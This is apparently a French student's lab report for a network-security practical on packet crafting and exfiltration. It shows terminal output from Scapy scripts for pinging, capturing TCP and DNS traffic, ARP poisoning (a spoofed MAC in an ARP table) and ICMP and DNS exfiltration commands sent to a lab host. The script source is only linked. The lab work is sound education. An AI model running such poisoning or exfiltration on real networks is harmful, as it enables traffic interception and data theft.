# TP4 SECU : Exfiltration 
🌞 ping.py
```
PS C:\Users\tomma\Ynov\B2\B2-Reseau\tp4> python .\ping.py
Begin emission
.
Finished sending 1 packets
..*
Received 4 packets, got 1 answers, remaining 0 packets
Pong reçu : QueryAnswer(query=<Ether  dst=f2:39:c5:c0:07:e5 src=30:89:4a:d2:5a:aa type=IPv4 |<IP  frag=0 proto=icmp src=10.33.73.72 dst=10.33.67.174 |<ICMP  type=echo-request |>>>, answer=<Ether  dst=30:89:4a:d2:5a:aa src=f2:39:c5:c0:07:e5 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=28 id=48175 flags= frag=0 ttl=64 proto=icmp chksum=0x1d7a src=10.33.67.174 dst=10.33.73.72 |<ICMP  type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 unused=b'' |>>>)
```
[voir code](./scripts/ping.py)

🌞 tcp_cap.py
```
PS C:\Users\tomma\Ynov\B2\B2-Reseau\tp4> python .\tcp_cap.py
TCP SYN ACK reçu !
- Adresse IP src : 104.208.16.89
- Adresse IP dest : 10.33.73.72
- Port TCP src : 443
- Port TCP dst : 50303
```
[voir code](./scripts/tcp_cap.py)

🌞 dns_cap.py
```
PS C:\Users\tomma\Ynov\B2\B2-Reseau\tp4> python .\dns_cap.py
PS C:\Users\tomma\Ynov\B2\B2-Reseau\tp4> nslookup ynoc.com
Serveur :   bbox.lan
Address:  2001:861:4480:5ca0:36db:9cff:fe95:e48c

Réponse ne faisant pas autorité :
Nom :    ynoc.com
Address:  160.251.150.223
```
[voir code](./scripts/dns_cap.py)

🌞 dns_lookup.py
```
PS C:\Users\tomma\Ynov\B2\B2-Reseau\tp4> python .\dns_lookup.py
DNS Ans 104.26.11.233

```
[voir code](./scripts/dns_lookup.py)

## II. ARP Poisoning
🌞 arp_poisoning.py
```
[ton@client1 "]$ arp -a
bbox.lan (192.168.1.254) at 34:db:9c:95:4:8c [ether] on enp0s3
?🌞(192.168.1.46) at de:ad:be:ef:ca:fe [ether] on enp0s3🌞
client2.lan (192.168.1.156) at 08:00:27:cc:c4:2b [ether] on enp0s3
AsusTM.lan (192.168.1.147) at 30:89:4a:2:5a:aa [ether] on enp0s3 
```

## II. Exfiltration ICMP

🌞 icmp_exf_send.py
```
tom@Tom:~/Documents/B2-Reseau/tp4/scripts$ sudo python3 icmp_exf_send.py 10.1.1.1 j
[sudo] password for tom: 
.
Sent 1 packets.
```
[Voir code](./scripts/icmp_exf_send.py)  
🦈[Voir capture WIREWHARK](./Wireshark/icmp_exf_send.pcapng)  

🌞 dns_exfiltration_send.py
```
tom@Tom:~/Documents/B2-Reseau/tp4/scripts$ sudo python3 dns_exfiltration_send.py 10.1.1.1 toto
.
Sent 1 packets.
```
[Voir code](./Scripts/dns_exfiltration_send.py)  
🦈[Voir capture WIREWHARK](./Wireshark/dns_exfiltration_send.pcapng)  
